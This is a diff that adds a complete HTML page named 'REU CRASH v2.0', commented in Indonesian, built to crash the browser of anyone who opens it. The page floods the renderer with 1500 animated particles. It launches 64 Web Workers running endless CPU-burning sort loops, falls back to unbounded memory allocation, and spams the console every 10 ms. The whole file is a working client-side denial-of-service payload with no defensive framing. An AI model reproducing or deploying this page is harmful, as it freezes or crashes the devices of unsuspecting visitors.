@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>REU CRASH v2.0</title>
+    <style>
+        body { margin: 0; overflow: hidden; background: #000; }
+        .particle {
+            width: 2px;
+            height: 2px;
+            background: cyan;
+            position: absolute;
+            border-radius: 50%;
+            box-shadow: 0 0 20px red, 0 0 40px blue;
+            animation: move 0.001s infinite alternate;
+        }
+        @keyframes move {
+            0% { transform: translate(0,0) scale(1); }
+            100% { transform: translate(100vw,100vh) scale(50); background: magenta; }
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // --- BAGIAN 1: CRASH CSS (RENDER) ---
+        for (let i = 0; i < 1500; i++) {
+            let p = document.createElement('div');
+            p.className = 'particle';
+            p.style.left = Math.random() * 100 + '%';
+            p.style.top = Math.random() * 100 + '%';
+            p.style.animationDelay = (Math.random() * 0.5) + 's';
+            p.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+            document.body.appendChild(p);
+        }
+
+        // --- BAGIAN 2: CRASH WEB WORKER (CPU) ---
+        if (window.Worker) {
+            for (let w = 0; w < 64; w++) { // Bikin 64 worker biar mantap
+                let workerScript = `
+                    let x = 0;
+                    while(true) {
+                        x = Math.pow(x, 2) + Math.random() * 999999;
+                        let arr = new Array(500000).fill('crash-' + Date.now());
+                        arr.sort();
+                    }
+                `;
+                let blob = new Blob([workerScript], { type: 'application/javascript' });
+                let worker = new Worker(URL.createObjectURL(blob));
+            }
+        } else {
+            // Fallback memory hog kalo worker gak didukung
+            let arr = [];
+            setInterval(() => {
+                for(let j=0; j<1000; j++) {
+                    arr.push(new Array(100000).join('xxx'));
+                }
+            }, 0);
+        }
+
+        // --- BAGIAN 3: BOMBARDIR CONSOLE (Opsional) ---
+        setInterval(() => {
+            console.log('%cREU SYSTEM LOCKED', 'font-size: 100px; color: red;');
+            console.trace();
+        }, 10);
+    </script>
+</body>
+</html>
